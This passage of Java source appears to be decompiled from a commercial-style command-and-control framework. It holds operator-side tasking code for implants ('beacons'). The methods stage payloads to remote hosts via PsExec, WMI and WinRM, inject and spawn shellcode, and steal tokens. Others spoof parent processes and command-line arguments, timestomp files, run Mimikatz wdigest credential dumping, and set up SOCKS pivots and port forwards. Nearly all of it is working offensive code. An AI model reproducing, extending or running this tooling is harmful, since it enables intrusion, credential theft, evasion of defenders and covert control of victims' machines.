    public void PivotListenerTCP(int n) {
        this.builder.setCommand(82);
        this.builder.addShort(n);
        byte[] arrby = this.builder.build();
        for (int i = 0; i < this.bids.length; i++) {
            log_task(this.bids[i], "Tasked " + CommonUtils.session(this.bids[i]) + " to accept TCP Beacon sessions on port " + n, "T1090");
            this.conn.call("beacons.task", CommonUtils.args(this.bids[i], arrby));
        }
    }

    public void PortScan(String string1, String string2, String string3, int n) {
        for (int i = 0; i < this.bids.length; i++) {
            BeaconEntry beaconEntry = DataUtils.getBeacon(this.data, this.bids[i]);
            if (beaconEntry != null)
                (new PortScannerJob(this, string1, string2, string3, n)).spawn(this.bids[i], beaconEntry.arch());
        }
    }

    public void PortForward(int n1, String string, int n2) {
        this.builder.setCommand(50);
        this.builder.addShort(n1);
        byte[] arrby = this.builder.build();
        for (int i = 0; i < this.bids.length; i++) {
            this.conn.call("beacons.rportfwd", CommonUtils.args(this.bids[i], Integer.valueOf(n1), string, Integer.valueOf(n2)));
            log_task(this.bids[i], "Tasked " + CommonUtils.session(this.bids[i]) + " to forward port " + n1 + " to " + string + ":" + n2, "T1090");
            this.conn.call("beacons.task", CommonUtils.args(this.bids[i], arrby));
        }
    }

    public void PortForwardStop(int n) {
        this.builder.setCommand(51);
        this.builder.addShort(n);
        byte[] arrby = this.builder.build();
        for (int i = 0; i < this.bids.length; i++) {
            log_task(this.bids[i], "Tasked " + CommonUtils.session(this.bids[i]) + " to stop port forward on " + n);
            this.conn.call("beacons.task", CommonUtils.args(this.bids[i], arrby));
            this.client.getConnection().call("beacons.pivot_stop_port", CommonUtils.args(n + ""));
        }
    }

    public void PowerShell(String string) {
        for (int i = 0; i < this.bids.length; i++)
            _PowerShell(this.bids[i], string);
    }

    public void _PowerShell(String string1, String string2) {
        PowerShellTasks powerShellTasks = new PowerShellTasks(this.client, string1);
        log_task(string1, "Tasked beacon to run: " + string2, "T1086");
        String str = powerShellTasks.getImportCradle();
        powerShellTasks.runCommand(str + string2);
    }

    public void PowerShellWithCradle(String string1, String string2) {
        for (int i = 0; i < this.bids.length; i++)
            _PowerShellWithCradle(this.bids[i], string1, string2);
    }

    public void _PowerShellWithCradle(String string1, String string2, String string3) {
        PowerShellTasks powerShellTasks = new PowerShellTasks(this.client, string1);
        log_task(string1, "Tasked beacon to run: " + string2, "T1086");
        powerShellTasks.runCommand(string3 + string2);
    }

    public void PowerShellNoImport(String string) {
        for (int i = 0; i < this.bids.length; i++) {
            PowerShellTasks powerShellTasks = new PowerShellTasks(this.client, this.bids[i]);
            powerShellTasks.runCommand(string);
        }
    }

    public void PowerShellUnmanaged(String string) {
        for (int i = 0; i < this.bids.length; i++) {
            BeaconEntry beaconEntry = DataUtils.getBeacon(this.data, this.bids[i]);
            String str = (new PowerShellTasks(this.client, this.bids[i])).getImportCradle();
            if (beaconEntry.is64()) {
                new PowerShellJob(this, str, string).spawn(this.bids[i], "x64");
            } else {
                new PowerShellJob(this, str, string).spawn(this.bids[i], "x86");
            }
        }
    }

    public void PowerShellUnmanaged(String string1, String string2) {
        for (int i = 0; i < this.bids.length; i++) {
            BeaconEntry beaconEntry = DataUtils.getBeacon(this.data, this.bids[i]);
            if (beaconEntry.is64()) {
                new PowerShellJob(this, string2, string1).spawn(this.bids[i], "x64");
            } else {
                new PowerShellJob(this, string2, string1).spawn(this.bids[i], "x86");
            }
        }
    }

    public void RemoteExecute(String string1, String string2, String string3) {
        BeaconRemoteExecMethods.RemoteExecMethod remoteExecMethod = DataUtils.getBeaconRemoteExecMethods(this.data).getRemoteExecMethod(string1);
        for (int i = 0; i < this.bids.length; i++)
            remoteExecMethod.remoteexec(this.bids[i], string2, string3);
    }

    public void SecureShell(String string1, String string2, String string3, int n) {
        for (int i = 0; i < this.bids.length; i++) {
            BeaconEntry beaconEntry = DataUtils.getBeacon(this.data, this.bids[i]);
            if (beaconEntry != null) {
                log_task(this.bids[i], "Tasked beacon to SSH to " + string3 + ":" + n + " as " + string1, "T1021, T1093");
                this.conn.call("beacons.task_ssh_login", CommonUtils.args(this.bids[i], string1, string2, string3, Integer.valueOf(n), beaconEntry.arch()));
            }
        }
    }

    public void SecureShellPubKey(String string1, byte[] arrby, String string2, int n) {
        for (int i = 0; i < this.bids.length; i++) {
            BeaconEntry beaconEntry = DataUtils.getBeacon(this.data, this.bids[i]);
            if (beaconEntry != null) {
                log_task(this.bids[i], "Tasked beacon to SSH to " + string2 + ":" + n + " as " + string1 + " (key auth)", "T1021, T1093");
                this.conn.call("beacons.task_ssh_login_pubkey", CommonUtils.args(this.bids[i], string1, CommonUtils.bString(arrby), string2, Integer.valueOf(n), beaconEntry.arch()));
            }
        }
    }

    protected List _extractFunctions(String string) {
        LinkedList linkedList = new LinkedList();
        if (funcp == null) {
            try {
                funcp = Pattern.compile("\\s*[fF]unction ([a-zA-Z0-9-]*).*?", 0);
            } catch (Exception exception) {
                MudgeSanity.logException("compile pattern to extract posh funcs", exception, false);
            }
        }
        String[] arrstring = string.split("\n");
        for (int i = 0; i < arrstring.length; i++) {
            String str = arrstring[i].trim();
            Matcher matcher = funcp.matcher(str);
            if (matcher.matches()) {
                linkedList.add(matcher.group(1));
            }
        }
        return linkedList;
    }

    public void PowerShellImportClear() {
        LinkedList linkedList = new LinkedList();
        String str = "";
        for (int i = 0; i < this.bids.length; i++) {
            DataUtils.reportPowerShellImport(this.client.getData(), this.bids[i], linkedList);
            this.conn.call("beacons.report_posh", CommonUtils.args(this.bids[i], linkedList));
            taskOneArg(37, str, "Tasked beacon to clear imported PowerShell script", "T1086, T1064");
        }
    }

    public void PowerShellImport(String string) {
        try {
            String str;
            List list;
            FileInputStream fileInputStream = new FileInputStream(string);
            byte[] arrby = CommonUtils.readAll(fileInputStream);
            fileInputStream.close();
            if (arrby.length == 0) {
                list = new LinkedList();
                str = "";
            } else {
                list = _extractFunctions(CommonUtils.bString(arrby));
                list.add("");
                str = (new PowerShellUtils(this.client)).PowerShellCompress(arrby);
            }
            if (str.length() > Tasks.max()) {
                error("max powershell import size is 1MB. Compressed script is: " + str.length() + " bytes");
                return;
            }
            for (int i = 0; i < this.bids.length; i++) {
                DataUtils.reportPowerShellImport(this.client.getData(), this.bids[i], list);
                this.conn.call("beacons.report_posh", CommonUtils.args(this.bids[i], list));
            }
            taskOneArg(37, str, "Tasked beacon to import: " + string, "T1086, T1064");
        } catch (IOException iOException) {
            MudgeSanity.logException("PowerShellImport: " + string, iOException, false);
        }
    }

    public void PPID(int n) {
        if (n == 0) {
            taskOneArgI(75, n, "Tasked beacon to use itself as parent process", "T1059, T1093, T1106");
        } else {
            taskOneArgI(75, n, "Tasked beacon to spoof " + n + " as parent process", "T1059, T1093, T1106");
        }
    }

    public void Ps() {
        taskNoArgsCallback(32, "Tasked beacon to list processes", "T1057");
    }

    public void PsExec(String string1, String string2, String string3, String string4) {
        ScListener scListener = ListenerUtils.getListener(this.client, string2);
        for (int i = 0; i < this.bids.length; i++)
            PsExec(this.bids[i], string1, string4, scListener, string3);
        linkToPayloadRemote(scListener, string1);
    }

    public void PsExec(String string1, String string2, String string3) {
        PsExec(string1, string2, string3, "x86");
    }

    public void PsExec(String string1, String string2, String string3, ScListener scListener, String string4) {
        String str1 = getPsExecService();
        byte[] arrby1 = scListener.export(string3);
        byte[] arrby2 = (new ArtifactUtils(this.client)).patchArtifact(arrby1, "x86".equals(string3) ? "artifact32svcbig.exe" : "artifact64svcbig.exe");
        String str2 = str1 + ".exe";
        String str3 = "\\\\127.0.0.1\\" + string4 + "\\" + str2;
        String str4 = "\\\\" + string2 + "\\" + string4 + "\\" + str2;
        if (".".equals(string2))
            str4 = str3;
        this.builder.setCommand(10);
        this.builder.addLengthAndEncodedString(string1, str4);
        this.builder.addString(CommonUtils.bString(arrby2));
        byte[] arrby3 = this.builder.build();
        this.builder.setCommand(58);
        this.builder.addLengthAndEncodedString(string1, string2);
        this.builder.addLengthAndString(str1);
        this.builder.addLengthAndString(str3);
        byte[] arrby4 = this.builder.build();
        this.builder.setCommand(56);
        this.builder.addEncodedString(string1, str4);
        byte[] arrby5 = this.builder.build();
        if (".".equals(string2)) {
            log_task(string1, "Tasked beacon to run " + scListener + " via Service Control Manager (" + str4 + ")", "T1035, T1050");
        } else if (string4.endsWith("$")) {
            log_task(string1, "Tasked beacon to run " + scListener + " on " + string2 + " via Service Control Manager (" + str4 + ")", "T1035, T1050, T1077");
        } else {
            log_task(string1, "Tasked beacon to run " + scListener + " on " + string2 + " via Service Control Manager (" + str4 + ")", "T1035, T1050");
        }
        this.conn.call("beacons.log_write", CommonUtils.args(BeaconOutput.ServiceIndicator(string1, string2, str1)));
        this.conn.call("beacons.log_write", CommonUtils.args(BeaconOutput.FileIndicator(string1, str4, arrby2)));
        this.conn.call("beacons.task", CommonUtils.args(string1, arrby3));
        this.conn.call("beacons.task", CommonUtils.args(string1, arrby4));
        this.conn.call("beacons.task", CommonUtils.args(string1, arrby5));
    }

    public void PsExecPSH(String string1, String string2) {
        ScListener scListener = ListenerUtils.getListener(this.client, string2);
        for (int i = 0; i < this.bids.length; i++)
            PsExecPSH(this.bids[i], string1, scListener);
        linkToPayloadRemote(scListener, string1);
    }

    public void PsExecPSH(String string1, String string2, ScListener scListener) {
        String str1 = scListener.getConfig().getStagerPipe();
        byte[] arrby1 = scListener.getPayloadStagerPipe(str1, "x86");
        String str2 = getPsExecService();
        this.builder.setCommand(58);
        this.builder.addLengthAndEncodedString(string1, string2);
        this.builder.addLengthAndString(str2);
        this.builder.addLengthAndString(cmd_sanity("%COMSPEC% /b /c start /b /min " + CommonUtils.bString((new PowerShellUtils(this.client)).buildPowerShellCommand(arrby1)), "psexec_psh"));
        byte[] arrby2 = this.builder.build();
        log_task(string1, "Tasked beacon to run " + scListener + " on " + string2 + " via Service Control Manager (PSH)", "T1035, T1050");
        this.conn.call("beacons.log_write", CommonUtils.args(BeaconOutput.ServiceIndicator(string1, string2, str2)));
        this.conn.call("beacons.task", CommonUtils.args(string1, arrby2));
        StagePipe(string1, string2, str1, "x86", scListener);
    }

    public void PsExecCommand(String string1, String string2) {
        String str = getPsExecService();
        for (int i = 0; i < this.bids.length; i++)
            PsExecCommand(this.bids[i], string1, str, string2);
    }

    public void PsExecCommand(String string1, String string2, String string3) {
        for (int i = 0; i < this.bids.length; i++)
            PsExecCommand(this.bids[i], string1, string2, string3);
    }

    public void PsExecCommand(String string1, String string2, String string3, String string4) {
        this.builder.setCommand(58);
        this.builder.addLengthAndEncodedString(string1, string2);
        this.builder.addLengthAndEncodedString(string1, string3);
        this.builder.addLengthAndEncodedString(string1, string4);
        byte[] arrby = this.builder.build();
        log_task(string1, "Tasked beacon to run '" + string4 + "' on " + string2 + " via Service Control Manager", "T1035, T1050");
        this.conn.call("beacons.log_write", CommonUtils.args(BeaconOutput.ServiceIndicator(string1, string2, string3)));
        this.conn.call("beacons.task", CommonUtils.args(string1, arrby));
    }

    public void PsInject(int n, String string1, String string2) {
        for (int i = 0; i < this.bids.length; i++) {
            String str = (new PowerShellTasks(this.client, this.bids[i])).getImportCradle();
            new PowerShellJob(this, str, string2).inject(n, string1);
        }
    }

    public void Pwd() {
        taskNoArgs(39, "Tasked beacon to print working directory");
    }

    public void RegQuery(Registry paramRegistry) {
        for (int i = 0; i < this.bids.length; i++)
            RegQuery(this.bids[i], paramRegistry);
    }

    public void RegQuery(String string, Registry paramRegistry) {
        BeaconEntry beaconEntry = DataUtils.getBeacon(this.data, string);
        this.builder.setCommand(81);
        this.builder.addShort(paramRegistry.getFlags(beaconEntry));
        this.builder.addShort(paramRegistry.getHive());
        this.builder.addLengthAndEncodedString(string, paramRegistry.getPath());
        this.builder.addLengthAndEncodedString(string, "");
        byte[] arrby = this.builder.build();
        log_task(string, "Tasked beacon to query " + paramRegistry.toString(), "T1012");
        this.conn.call("beacons.task", CommonUtils.args(string, arrby));
    }

    public void RegQueryValue(Registry paramRegistry) {
        for (int i = 0; i < this.bids.length; i++)
            RegQueryValue(this.bids[i], paramRegistry);
    }

    public void RegQueryValue(String string, Registry paramRegistry) {
        BeaconEntry beaconEntry = DataUtils.getBeacon(this.data, string);
        this.builder.setCommand(81);
        this.builder.addShort(paramRegistry.getFlags(beaconEntry));
        this.builder.addShort(paramRegistry.getHive());
        this.builder.addLengthAndEncodedString(string, paramRegistry.getPath());
        this.builder.addLengthAndEncodedString(string, paramRegistry.getValue());
        byte[] arrby = this.builder.build();
        log_task(string, "Tasked beacon to query " + paramRegistry.toString(), "T1012");
        this.conn.call("beacons.task", CommonUtils.args(string, arrby));
    }

    public void Rev2Self() {
        taskNoArgs(28, "Tasked beacon to revert token", "T1134");
    }

    public void Rm(String string) {
        for (int i = 0; i < this.bids.length; i++)
            Rm(this.bids[i], string);
    }

    public void Rm(String string1, String string2) {
        byte[] arrby1 = DataUtils.encodeForBeacon(this.client.getData(), string1, string2);
        if (arrby1.length == 0) {
            error(string1, "Rejected empty argument for rm. Use . to remove current folder");
            return;
        }
        String str = DataUtils.decodeForBeacon(this.client.getData(), string1, arrby1);
        if (!str.equals(string2)) {
            error(string1, "'" + string2 + "' did not decode in a sane way. Specify '" + str + "' explicity.");
            return;
        }
        this.builder.setCommand(56);
        this.builder.addString(arrby1);
        byte[] arrby2 = this.builder.build();
        log_task(string1, "Tasked beacon to remove " + string2, "T1107, " + file_to_tactic(string2));
        this.conn.call("beacons.task", CommonUtils.args(string1, arrby2));
    }

    public void Run(String string) {
        for (int i = 0; i < this.bids.length; i++) {
            this.builder.setCommand(78);
            this.builder.addLengthAndString("");
            this.builder.addLengthAndEncodedString(this.bids[i], string);
            this.builder.addShort(0);
            byte[] arrby = this.builder.build();
            log_task(this.bids[i], "Tasked beacon to run: " + string, "T1059");
            this.conn.call("beacons.task", CommonUtils.args(this.bids[i], arrby));
        }
    }

    public void RunAs(String string1, String string2, String string3, String string4) {
        for (int i = 0; i < this.bids.length; i++) {
            this.builder.setCommand(38);
            this.builder.addLengthAndEncodedString(this.bids[i], string1);
            this.builder.addLengthAndEncodedString(this.bids[i], string2);
            this.builder.addLengthAndEncodedString(this.bids[i], string3);
            this.builder.addLengthAndEncodedString(this.bids[i], string4);
            byte[] arrby = this.builder.build();
            log_task(this.bids[i], "Tasked beacon to execute: " + string4 + " as " + string1 + "\\" + string2, "T1078, T1106");
            this.conn.call("beacons.task", CommonUtils.args(this.bids[i], arrby));
        }
    }

    public void RunUnder(int n, String string) {
        for (int i = 0; i < this.bids.length; i++) {
            this.builder.setCommand(76);
            this.builder.addInteger(n);
            this.builder.addLengthAndEncodedString(this.bids[i], string);
            byte[] arrby = this.builder.build();
            log_task(this.bids[i], "Tasked beacon to execute: " + string + " as a child of " + n, "T1106");
            this.conn.call("beacons.task", CommonUtils.args(this.bids[i], arrby));
        }
    }

    public void Screenshot(int n1, String string, int n2) {
        (new ScreenshotJob(this, n2)).inject(n1, string);
    }

    public void Screenshot(int n) {
        for (int i = 0; i < this.bids.length; i++) {
            BeaconEntry beaconEntry = DataUtils.getBeacon(this.data, this.bids[i]);
            if (beaconEntry != null)
                (new ScreenshotJob(this, n)).spawn(this.bids[i], beaconEntry.arch());
        }
    }

    public void Shell(String string) {
        for (int i = 0; i < this.bids.length; i++)
            Shell(this.bids[i], CommonUtils.session(this.bids[i]), string);
    }

    public void Shell(String string1, String string2, String string3) {
        if (string2.equals("session")) {
            this.builder.setCommand(2);
            this.builder.addEncodedString(string1, string3);
        } else if (string2.equals("beacon")) {
            this.builder.setCommand(78);
            this.builder.addLengthAndString("%COMSPEC%");
            this.builder.addLengthAndEncodedString(string1, " /C " + string3);
            this.builder.addShort(0);
        } else {
            CommonUtils.print_error("Unknown session type '" + string2 + "' for " + string1 + ". Didn't run '" + string3 + "'");
            return;
        }
        byte[] arrby = this.builder.build();
        log_task(string1, "Tasked " + string2 + " to run: " + string3, "T1059");
        this.conn.call("beacons.task", CommonUtils.args(string1, arrby));
    }

    public void ShellSudo(String string1, String string2) {
        taskOneArg(2, "echo \"" + string1 + "\" | sudo -S " + string2, "Tasked session to run: " + string2 + " (sudo)", "T1169");
    }

    public void Sleep(int n1, int n2) {
        this.builder.setCommand(4);
        if (n1 == 0) {
            this.builder.addInteger(100);
            this.builder.addInteger(90);
        } else {
            this.builder.addInteger(n1 * 1000);
            this.builder.addInteger(n2);
        }
        byte[] arrby = this.builder.build();
        for (int i = 0; i < this.bids.length; i++) {
            BeaconEntry beaconEntry1 = DataUtils.getEgressBeacon(this.data, this.bids[i]);
            BeaconEntry beaconEntry2 = DataUtils.getBeacon(this.data, this.bids[i]);
            if (beaconEntry1 != null && beaconEntry2 != null && !beaconEntry1.getId().equals(this.bids[i])) {
                if (n1 == 0) {
                    log_task(this.bids[i], "Tasked " + CommonUtils.session(this.bids[i]) + " to become interactive [change made to: " + beaconEntry1.title() + "]");
                    this.conn.call("beacons.log_write", CommonUtils.args(BeaconOutput.Input(beaconEntry1.getId(), "sleep 0 [from: " + beaconEntry2.title() + "]")));
                    log_task(beaconEntry1.getId(), "Tasked beacon to become interactive", "T1029");
                } else if (n2 == 0) {
                    log_task(this.bids[i], "Tasked " + CommonUtils.session(this.bids[i]) + " to sleep for " + n1 + "s [change made to: " + beaconEntry1.title() + "]");
                    this.conn.call("beacons.log_write", CommonUtils.args(BeaconOutput.Input(beaconEntry1.getId(), "sleep " + n1 + "s [from: " + beaconEntry2.title() + "]")));
                    log_task(beaconEntry1.getId(), "Tasked beacon to sleep for " + n1 + "s", "T1029");
                } else {
                    log_task(this.bids[i], "Tasked " + CommonUtils.session(this.bids[i]) + " to sleep for " + n1 + "s (" + n2 + "% jitter) [change made to: " + beaconEntry1.title() + "]");
                    this.conn.call("beacons.log_write", CommonUtils.args(BeaconOutput.Input(beaconEntry1.getId(), "sleep " + n1 + " " + n2 + " [from: " + beaconEntry2.title() + "]")));
                    log_task(beaconEntry1.getId(), "Tasked beacon to sleep for " + n1 + "s (" + n2 + "% jitter)", "T1029");
                }
                this.conn.call("beacons.task", CommonUtils.args(beaconEntry1.getId(), arrby));
            } else {
                if (n1 == 0) {
                    log_task(this.bids[i], "Tasked beacon to become interactive", "T1029");
                } else if (n2 == 0) {
                    log_task(this.bids[i], "Tasked beacon to sleep for " + n1 + "s", "T1029");
                } else {
                    log_task(this.bids[i], "Tasked beacon to sleep for " + n1 + "s (" + n2 + "% jitter)", "T1029");
                }
                this.conn.call("beacons.task", CommonUtils.args(this.bids[i], arrby));
            }
        }
    }

    public void GoInteractive(String string) {
        BeaconEntry beaconEntry = DataUtils.getEgressBeacon(this.data, string);
        this.builder.setCommand(4);
        this.builder.addInteger(100);
        this.builder.addInteger(90);
        byte[] arrby = this.builder.build();
        if (beaconEntry != null)
            this.conn.call("beacons.task", CommonUtils.args(beaconEntry.getId(), arrby));
    }

    public void SetEnv(String string1, String string2) {
        StringBuffer stringBuffer = new StringBuffer();
        stringBuffer.append(string1);
        stringBuffer.append("=");
        if (string2 != null && string2.length() > 0) {
            stringBuffer.append(string2);
            stringBuffer.append(false);
            taskOneEncodedArg(72, stringBuffer.toString(), "Tasked beacon to set " + string1 + " to " + string2, "");
        } else {
            stringBuffer.append(false);
            taskOneEncodedArg(72, stringBuffer.toString(), "Tasked beacon to unset " + string1, "");
        }
    }

    public void SocksStart(int n) {
        for (int i = 0; i < this.bids.length; i++) {
            GoInteractive(this.bids[i]);
            this.conn.call("beacons.pivot", CommonUtils.args(this.bids[i], new Integer(n)));
        }
    }

    public void SocksStop() {
        for (int i = 0; i < this.bids.length; i++)
            this.conn.call("beacons.pivot_stop", CommonUtils.args(this.bids[i]));
    }

    public void Spawn(String string1, ScListener scListener, String string2) {
        boolean bool = false;
        if ("x86".equals(string2)) {
            this.builder.setCommand(1);
        } else if ("x64".equals(string2)) {
            this.builder.setCommand(44);
        }
        this.builder.addString(scListener.export(string2));
        byte[] arrby = this.builder.build();
        log_task(string1, "Tasked beacon to spawn (" + string2 + ") " + scListener.toString(), "T1093");
        this.conn.call("beacons.task", CommonUtils.args(string1, arrby));
    }

    public void Spawn(String string) {
        ScListener scListener = ListenerUtils.getListener(this.client, string);
        for (int i = 0; i < this.bids.length; i++) {
            if (scListener.isForeign()) {
                Spawn(this.bids[i], scListener, "x86");
            } else {
                Spawn(this.bids[i], scListener, arch(this.bids[i]));
            }
        }
        linkToPayloadLocal(scListener);
    }

    public void Spawn(String string1, String string2) {
        ScListener scListener = ListenerUtils.getListener(this.client, string1);
        byte[] arrby = scListener.export(string2);
        byte b = 0;
        if ("x86".equals(string2)) {
            b = 1;
        } else if ("x64".equals(string2)) {
            b = 44;
        }
        taskOneArg(b, CommonUtils.bString(arrby), "Tasked beacon to spawn (" + string2 + ") " + scListener.toString(), "T1093");
        linkToPayloadLocal(scListener);
    }

    public void SpawnAs(String string1, String string2, String string3, String string4) {
        ScListener scListener = ListenerUtils.getListener(this.client, string4);
        for (int i = 0; i < this.bids.length; i++) {
            String str = arch(this.bids[i]);
            this.builder.setCommand("x64".equals(str) ? 94 : 93);
            this.builder.addLengthAndEncodedString(this.bids[i], string1);
            this.builder.addLengthAndEncodedString(this.bids[i], string2);
            this.builder.addLengthAndEncodedString(this.bids[i], string3);
            this.builder.addString(scListener.export(str));
            byte[] arrby = this.builder.build();
            this.conn.call("beacons.task", CommonUtils.args(this.bids[i], arrby));
            log_task(this.bids[i], "Tasked beacon to spawn " + scListener + " as " + string1 + "\\" + string2, "T1078, T1093, T1106");
        }
        linkToPayloadLocal(scListener);
    }

    public void SpawnTo() {
        taskNoArgs(13, "Tasked beacon to spawn features to default process", "T1093");
    }

    public void SpawnTo(String string1, String string2) {
        if ("x86".equals(string1)) {
            taskOneEncodedArg(13, string2, "Tasked beacon to spawn " + string1 + " features to: " + string2, "T1093");
        } else {
            taskOneEncodedArg(69, string2, "Tasked beacon to spawn " + string1 + " features to: " + string2, "T1093");
        }
    }

    public void SpawnUnder(int n, String string) {
        ScListener scListener = ListenerUtils.getListener(this.client, string);
        for (int i = 0; i < this.bids.length; i++) {
            String str = arch(this.bids[i]);
            this.builder.setCommand("x64".equals(str) ? 99 : 98);
            this.builder.addInteger(n);
            this.builder.addString(scListener.export(str));
            byte[] arrby = this.builder.build();
            this.conn.call("beacons.task", CommonUtils.args(this.bids[i], arrby));
            log_task(this.bids[i], "Tasked beacon to spawn " + scListener + " as a child of " + n, "T1106, T1093");
        }
        linkToPayloadLocal(scListener);
    }

    public void SpoofArgsAdd(String string1, String string2) {
        String str = string1 + " " + string2;
        this.builder.setCommand(83);
        this.builder.addLengthAndString(string1);
        this.builder.addLengthAndString(string1 + " " + string2);
        byte[] arrby = this.builder.build();
        for (int i = 0; i < this.bids.length; i++) {
            log_task(this.bids[i], "Tasked beacon to spoof '" + string1 + "' as '" + string2 + "'", "T1059, T1093, T1106");
            this.conn.call("beacons.task", CommonUtils.args(this.bids[i], arrby));
        }
    }

    public void SpoofArgsList() {
        taskNoArgsCallback(85, "Tasked beacon to list programs and spoofed arguments", "");
    }

    public void SpoofArgsRemove(String string) {
        this.builder.setCommand(84);
        this.builder.addString(string + Character.MIN_VALUE);
        byte[] arrby = this.builder.build();
        for (int i = 0; i < this.bids.length; i++) {
            log_task(this.bids[i], "Tasked beacon to not spoof arguments for '" + string + "'", "T1059, T1093, T1106");
            this.conn.call("beacons.task", CommonUtils.args(this.bids[i], arrby));
        }
    }

    public void StealToken(int n) {
        taskOneArgI(31, n, "Tasked beacon to steal token from PID " + n, "T1134");
    }

    public void ShellcodeInject(int n, String string1, String string2) {
        byte[] arrby1 = CommonUtils.readFile(string2);
        if ("x64".equals(string1)) {
            this.builder.setCommand(43);
        } else {
            this.builder.setCommand(9);
        }
        this.builder.addInteger(n);
        this.builder.addInteger(0);
        this.builder.addString(CommonUtils.bString(arrby1));
        byte[] arrby2 = this.builder.build();
        for (int i = 0; i < this.bids.length; i++) {
            log_task(this.bids[i], "Tasked beacon to inject " + string2 + " into " + n, "T1055");
            this.conn.call("beacons.task", CommonUtils.args(this.bids[i], arrby2));
        }
    }

    public void ShellcodeSpawn(String string1, String string2) {
        byte[] arrby1 = CommonUtils.readFile(string2);
        if ("x64".equals(string1)) {
            this.builder.setCommand(44);
        } else {
            this.builder.setCommand(1);
        }
        this.builder.addString(CommonUtils.bString(arrby1));
        byte[] arrby2 = this.builder.build();
        for (int i = 0; i < this.bids.length; i++) {
            log_task(this.bids[i], "Tasked beacon to spawn " + string2 + " in " + string1 + " process", "T1093");
            this.conn.call("beacons.task", CommonUtils.args(this.bids[i], arrby2));
        }
    }

    public void StagePipe(String string1, String string2, String string3, String string4, ScListener scListener) {
        byte[] arrby = scListener.export(string4);
        arrby = ArtifactUtils.XorEncode(arrby, string4);
        this.builder.setCommand(57);
        this.builder.addLengthAndString("\\\\" + string2 + "\\pipe\\" + string3);
        this.builder.addString(arrby);
        this.conn.call("beacons.task", CommonUtils.args(string1, this.builder.build()));
    }

    public void StageTCP(String string1, String string2, int n, String string3, ScListener scListener) {
        this.builder.setCommand(52);
        this.builder.addLengthAndStringASCIIZ(string2);
        this.builder.addInteger(n);
        byte[] arrby1 = scListener.export(string3);
        arrby1 = ArtifactUtils.XorEncode(arrby1, string3);
        byte[] arrby2 = CommonUtils.toBytes(scListener.getProfile().getString(".bind_tcp_garbage"));
        this.builder.addString(Shellcode.BindProtocolPackage(CommonUtils.join(arrby2, arrby1)));
        this.conn.call("beacons.task", CommonUtils.args(string1, this.builder.build()));
    }

    public void TimeStomp(String string1, String string2) {
        for (int i = 0; i < this.bids.length; i++)
            TimeStomp(this.bids[i], string1, string2);
    }

    public void TimeStomp(String string1, String string2, String string3) {
        this.builder.setCommand(29);
        this.builder.addLengthAndEncodedString(string1, string3);
        this.builder.addLengthAndEncodedString(string1, string2);
        byte[] arrby = this.builder.build();
        log_task(string1, "Tasked beacon to timestomp " + string2 + " to " + string3, "T1099");
        this.conn.call("beacons.task", CommonUtils.args(string1, arrby));
    }

    public void Unlink(String string) {
        for (int i = 0; i < this.bids.length; i++) {
            log_task(this.bids[i], "Tasked to unlink " + string, "T1090");
            this.conn.call("beacons.unlink", CommonUtils.args(this.bids[i], string));
        }
    }

    public void Unlink(String string1, String string2) {
        for (int i = 0; i < this.bids.length; i++) {
            log_task(this.bids[i], "Tasked to unlink " + string1 + "@" + string2, "T1090");
            this.conn.call("beacons.unlink", CommonUtils.args(this.bids[i], string1, string2));
        }
    }

    public void Upload(String string) {
        String str = (new File(string)).getName();
        Upload(string, str);
    }

    public void Upload(String string1, String string2) {
        try {
            FileInputStream fileInputStream = new FileInputStream(string1);
            byte[] arrby = CommonUtils.readAll(fileInputStream);
            fileInputStream.close();
            UploadRaw(string1, string2, arrby);
        } catch (Exception exception) {
            MudgeSanity.logException("Upload: " + string1 + " -> " + string2, exception, false);
        }
    }

    public void UploadRaw(String string1, String string2, byte[] arrby) {
        for (int i = 0; i < this.bids.length; i++)
            UploadRaw(this.bids[i], string1, string2, arrby);
    }

    public void UploadRaw(String string1, String string2, String string3, byte[] arrby) {
        ByteIterator byteIterator = new ByteIterator(arrby);
        LinkedList<byte[]> linkedList = new LinkedList();
        this.builder.setCommand(10);
        this.builder.addLengthAndEncodedString(string1, string3);
        this.builder.addString(CommonUtils.bString(byteIterator.next(786432L)));
        linkedList.add(this.builder.build());
        while (byteIterator.hasNext()) {
            this.builder.setCommand(67);
            this.builder.addLengthAndEncodedString(string1, string3);
            this.builder.addString(CommonUtils.bString(byteIterator.next(260096L)));
            linkedList.add(this.builder.build());
        }
        log_task(string1, "Tasked beacon to upload " + string2 + " as " + string3);
        for (byte[] arrby1 : linkedList) {
            conn.call("beacons.task", CommonUtils.args(string1, arrby1));
        }
        conn.call("beacons.log_write",
                CommonUtils.args(BeaconOutput.FileIndicator(string1, string3, arrby)));
    }

    public void WDigest() {
        MimikatzSmall("sekurlsa::wdigest");
    }

    public void WinRM(String string1, String string2) {
        ScListener scListener = ListenerUtils.getListener(this.client, string2);
        for (int i = 0; i < this.bids.length; i++)
            WinRM(this.bids[i], string1, "x86", scListener);
    }

    public void WinRM(String string1, String string2, String string3, ScListener scListener) {
        byte[] arrby = scListener.export(string3);
        String str1 = CommonUtils.bString((new ResourceUtils(this.client)).buildPowerShell(arrby, "x64".equals(string3)));
        str1 = "Invoke-Command -ComputerName " + string2 + " -ScriptBlock { " + str1 + " }";
        log_task(string1, "Tasked beacon to run " + scListener + " on " + string2 + " via WinRM", "T1028, T1086");
        PowerShellTasks powerShellTasks = new PowerShellTasks(this.client, string1);
        String str2 = powerShellTasks.getScriptCradle(str1);
        powerShellTasks.runCommand(str2);
    }

    public void WMI(String string1, String string2) {
        ScListener scListener = ListenerUtils.getListener(this.client, string2);
        for (int i = 0; i < this.bids.length; i++)
            WMI(this.bids[i], string1, scListener);
    }

    public void WMI(String string1, String string2, ScListener scListener) {
        PowerShellTasks powerShellTasks = new PowerShellTasks(this.client, string1);
        byte[] arrby = scListener.getPayloadStager("x86");
        String str1 = CommonUtils.bString((new PowerShellUtils(this.client)).buildPowerShellCommand(arrby));
        str1 = "Invoke-WMIMethod win32_process -name create -argumentlist '" + str1 + "' -ComputerName " + string2;
        log_task(string1, "Tasked beacon to run " + scListener + " on " + string2 + " via WMI", "T1047, T1086");
        String str2 = powerShellTasks.getScriptCradle(str1);
        powerShellTasks.runCommand(str2);
    }

    public void linkToPayloadLocal(ScListener scListener) {
        if ("windows/beacon_bind_pipe".equals(scListener.getPayload())) {
            Pause(1000);
            for (int i = 0; i < this.bids.length; i++)
                LinkExplicit(this.bids[i], scListener.getPipeName("."));
        } else if ("windows/beacon_bind_tcp".equals(scListener.getPayload())) {
            Pause(1000);
            for (int i = 0; i < this.bids.length; i++)
